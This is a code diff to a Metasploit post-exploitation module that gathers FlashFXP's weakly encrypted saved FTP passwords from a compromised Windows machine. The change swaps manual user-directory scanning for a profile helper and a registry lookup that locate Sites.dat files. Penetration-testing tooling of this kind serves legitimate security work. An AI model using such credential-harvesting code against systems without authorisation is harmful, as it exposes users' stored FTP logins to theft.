@@ -10,16 +10,19 @@
 require 'msf/core'
 require 'rex'
 require 'rex/parser/ini'
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather FlashFXP Saved Password Extraction',
-				'Description'   => %q{ This module extracts weakly encrypted saved FTP Passwords 
-					from FlashFXP. It finds saved FTP connections in the Sites.dat file. },
+				'Description'   => %q{ 
+					This module extracts weakly encrypted saved FTP Passwords  from FlashFXP. It
+					finds saved FTP connections in the Sites.dat file. },
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
 				'Version'       => '$Revision$',
@@ -30,31 +33,33 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
+
 		@fxppaths = []
-		@userpaths = []
-		os = session.sys.config.sysinfo['OS']
-		drive = session.fs.file.expand_path("%SystemDrive%")
-		if os =~ /Windows 7|Vista|2008/
-			@appdata = '\\AppData\\Roaming\\FlashFXP\\'
-			@users = drive + '\\Users'
-			@userpaths << drive + '\\ProgramData\\FlashFXP\\'
-		else
-			@appdata = '\\Application Data\\FlashFXP\\'
-			@users = drive + '\\Documents and Settings'
+		
+		#Checks if the Site data is stored in a generic location  for all users
+		flash_reg = "HKLM\\SOFTWARE\\FlashFXP"
+		flash_reg_ver = registry_enumkeys("#{flash_reg}")
+		
+		unless flash_reg_ver.nil?
+				software_key = "#{flash_reg}\\#{flash_reg_ver.join}"
+				generic_path = registry_getvaldata(software_key, "InstallerDataPath")
+			unless generic_path.include? "%APPDATA%"
+				@fxppaths << generic_path + "\\Sites.dat"
+			end
 		end
-		get_users()
-		@userpaths.each{|up| get_ver_dirs(up)}
+		
+		grab_user_profiles().each do |user|
+			next if user['AppData'] == nil
+			tmpath= user['AppData'] + '\\FlashFXP\\'
+			get_ver_dirs(tmpath)
+		end
+
 		@fxppaths.each do |fxp|
 			get_ini(fxp)
 		end
 	end
 
-	def get_users
-		session.fs.dir.foreach(@users) do |path|
-			next if path =~ /^(\.|\.\.|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
-			@userpaths << "#{@users}\\#{path}\\#{@appdata}\\"
-		end
-	end
+	
 
 	def get_ver_dirs(path)
 		begin
